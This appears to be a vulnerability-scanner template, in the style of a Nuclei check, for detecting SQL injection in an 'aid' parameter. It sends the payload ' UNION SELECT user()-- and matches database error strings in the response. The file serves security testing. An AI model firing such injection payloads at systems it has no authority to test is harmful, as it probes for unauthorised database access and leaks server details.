id: sqli7-133
name: 'UNION probe in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - union
description: 'Triggers DB error via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - ''' UNION SELECT user()--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
